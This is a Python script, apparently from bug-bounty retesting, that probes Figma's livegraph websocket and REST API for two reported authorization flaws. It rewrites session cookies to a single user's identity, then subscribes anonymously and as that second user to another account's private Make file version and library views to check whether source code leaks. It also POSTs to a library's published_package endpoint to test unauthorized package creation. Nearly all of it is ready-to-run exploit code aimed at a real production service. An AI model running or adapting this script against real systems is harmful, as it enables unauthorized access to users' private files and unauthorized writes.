# -*- coding: utf-8 -*-
"""报告1 复测: FileMakeVersionsView 匿名/纯净B + code_snapshot + published_package(纯净B)
目标: 判断报告1(私有Make源码泄露)与报告2(published_package越权写)是否仍然成立
"""
import io, json, sys, asyncio, urllib.parse, urllib.request, urllib.error
import websockets
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = "https://www.figma.com"
MAKE_FILE = "5zb5YkoxMa09KpqOyuLcHD"
PUB_LIB = "bv2nMIdFf4u3dESGail4sm"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/151.0.0.0 Safari/537.36"
A_UID = "1666382703778278399"
B_UID = "1667396392129259941"
HASH = "ab" * 16


def load(p):
    return io.open(p, encoding='utf-8').read().strip().replace('\n', '; ')


def make_abs_pure(cookie, keep_uid):
    parts = {}
    for p in cookie.split('; '):
        if '=' in p:
            k, v = p.split('=', 1)
            parts[k] = v
    d = json.loads(urllib.parse.unquote(parts.get('__Host-figma.authn', '')))
    d = {k: v for k, v in d.items() if k == keep_uid}
    parts['__Host-figma.authn'] = urllib.parse.quote(json.dumps(d, separators=(',', ':')))
    if '__Host-figma.embed' in parts:
        ne = json.loads(urllib.parse.unquote(parts['__Host-figma.embed']))
        ne = {k: v for k, v in ne.items() if k == keep_uid}
        parts['__Host-figma.embed'] = urllib.parse.quote(json.dumps(ne, separators=(',', ':')))
    return '; '.join(f'{k}={v}' for k, v in parts.items())


rawA = load('ws_cookie_A_new.txt')
rawB = load('ws_cookie_B_new.txt')
PBC = make_abs_pure(rawB, B_UID)


def lg_url(uid, client_url):
    return (f"wss://www.figma.com/api/livegraph?pv=1&userId={uid or ''}&anonUserId="
            f"&clientType=web&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Fmake%2F{client_url}"
            f"&connectionType=initial&reconnect=0")


def auth(uid):
    return {"messageType": "auth", "clientType": "web",
            "args": {"userId": uid, "anonymousUserId": None},
            "tags": {"clientType": "web", "clientUrl": f"https://www.figma.com/make/{MAKE_FILE}"},
            "clientRequestedVersion": 2}


async def sub(label, view, args, cookie=None, uid=None, wait=10):
    headers = {"User-Agent": UA, "Origin": BASE}
    if cookie:
        headers["Cookie"] = cookie
    frames = []
    try:
        async with websockets.connect(lg_url(uid, MAKE_FILE), additional_headers=headers,
                                      max_size=50_000_000, open_timeout=15) as ws:
            await ws.send(json.dumps(auth(uid)))
            for _ in range(3):
                msg = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(msg, str) and "authSuccess" in msg:
                    break
            await ws.send(json.dumps({"messageType": "subscribe", "viewName": view,
                                      "viewHash": HASH, "loadType": "initial", "args": args}))
            deadline = asyncio.get_event_loop().time() + wait
            while asyncio.get_event_loop().time() < deadline:
                try:
                    msg = await asyncio.wait_for(ws.recv(), timeout=3)
                    if isinstance(msg, str):
                        frames.append(msg)
                except asyncio.TimeoutError:
                    break
    except Exception as e:
        print(f"[{label}] ❌ {type(e).__name__}: {str(e)[:110]}")
        return
    hits = [f for f in frames if '"initial":' in f or 'viewSubscriptionFailed' in f or '"error"' in f]
    print(f"\n[{label}] 帧={len(frames)} 有效={len(hits)}")
    for f in hits:
        if 'viewSubscriptionFailed' in f or '"error"' in f:
            print(f"  🚫 {f[:400]}")
        else:
            print(f"  🖼 {len(f)}B {f[:900]}")
            print()


async def main():
    print("========== 报告1 复测: FileMakeVersionsView (A 私有 Make 文件) ==========")
    args = {"fileKey": MAKE_FILE, "firstPageSize": 10}
    await sub("匿名 WS", "FileMakeVersionsView", args)
    await sub("纯净B WS", "FileMakeVersionsView", args, cookie=PBC, uid=B_UID)
    await sub("A owner WS (基线)", "FileMakeVersionsView", args, cookie=rawA, uid=A_UID)

    print("\n========== FileMakeLibraryView 对照 ==========")
    await sub("匿名 WS library", "FileMakeLibraryView", {"fileKey": MAKE_FILE})
    await sub("纯净B WS library", "FileMakeLibraryView", {"fileKey": MAKE_FILE}, cookie=PBC, uid=B_UID)


def rest_call(label, path, cookie=None, method="GET", body=None):
    h = {'User-Agent': UA, 'Accept': 'application/json'}
    if cookie:
        h['Cookie'] = cookie
    data = None
    if body is not None:
        h['Content-Type'] = 'application/json'
        data = json.dumps(body).encode()
    req = urllib.request.Request(BASE + path, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            raw = r.read().decode(errors='replace')
            print(f'[{label}] HTTP {r.status} {raw[:300]}')
            return r.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors='replace')
        print(f'[{label}] HTTP {e.code} {raw[:250]}')
        return e.code, raw
    except Exception as e:
        print(f'[{label}] ERR {type(e).__name__} {str(e)[:100]}')
        return None, str(e)


if __name__ == "__main__":
    print("\n========== 报告2 复测: published_package (纯净B) ==========")
    rest_call('纯净B create pkg', f'/api/files/{PUB_LIB}/published_package', cookie=PBC, method='POST',
              body={"package_identifier": "verify-r2", "package_type": "npm"})
    rest_call('匿名 create pkg', f'/api/files/{PUB_LIB}/published_package', method='POST',
              body={"package_identifier": "verify-r2", "package_type": "npm"})
    asyncio.run(main())
